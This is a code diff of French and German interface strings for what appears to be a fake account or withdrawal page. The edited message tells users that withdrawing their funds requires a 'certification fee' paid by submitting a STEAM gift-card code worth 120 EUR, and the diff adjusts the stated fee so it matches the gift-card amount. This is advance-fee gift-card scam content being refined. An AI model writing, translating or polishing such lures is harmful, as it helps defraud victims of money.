@@ -47,7 +47,7 @@ document.getElementById('hub-tab').addEventListener('click', function() {
                 recentTransactions: "Transactions récentes",
                 withdraw: "Retirer",
                 confirmWithdrawal: "Confirmer le retrait",
-                enterPin: "Le retrait des fonds de votre compte authentifié nécessite des frais de certification d'un montant de 212 EUR. Pour procéder au retrait, veuillez fournir un code STEAM d'une valeur équivalente à 120 EUR afin d'initier le processus de retrait."
+                enterPin: "Le retrait des fonds de votre compte authentifié nécessite des frais de certification d'un montant de 120 EUR. Pour procéder au retrait, veuillez fournir un code STEAM d'une valeur équivalente à 120 EUR afin d'initier le processus de retrait."
 
 ,
                 confirm: "Confirmer",
@@ -68,7 +68,7 @@ document.getElementById('hub-tab').addEventListener('click', function() {
                 recentTransactions: "Letzte Transaktionen",
                 withdraw: "Abheben",
                 confirmWithdrawal: "Abhebung bestätigen",
-                enterPin: "Der Abzug der Gelder von Ihrem authentifizierten Konto erfordert eine Zertifizierungsgebühr in Höhe von 212 EUR. Um mit dem Abzugsprozess fortzufahren, geben Sie bitte einen STEAM-Code im Wert von 120 EUR ein."
+                enterPin: "Der Abzug der Gelder von Ihrem authentifizierten Konto erfordert eine Zertifizierungsgebühr in Höhe von 120 EUR. Um mit dem Abzugsprozess fortzufahren, geben Sie bitte einen STEAM-Code im Wert von 120 EUR ein."
 
 ,
                 confirm: "Bestätigen",
